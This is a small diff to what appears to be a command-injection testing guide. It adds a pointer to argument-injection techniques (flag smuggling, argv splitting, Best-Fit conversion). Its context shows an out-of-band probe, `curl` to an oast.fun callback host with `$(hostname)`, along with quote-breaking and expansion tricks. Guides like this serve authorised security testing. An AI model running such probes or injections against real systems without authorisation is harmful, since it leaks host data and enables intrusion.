@@ -80,6 +80,7 @@ curl https://xyz.oast.fun/$(hostname)
 - Break out of quoted segments by alternating quotes and escapes
 - Environment expansion: `$PATH`, `${HOME}`, command substitution
 - Windows: `%TEMP%`, `!VAR!`, PowerShell `$(...)`
+- When the sink is a shell-free subprocess (`execve`/`subprocess.run([...])`) with a user-controlled argument, load `argument_injection` — flag smuggling, argv splitting, and Windows Best-Fit conversion apply even with correct shell-escaping
 
 **Path and Builtin Confusion**
 - Force absolute paths (`/usr/bin/id`) vs relying on PATH
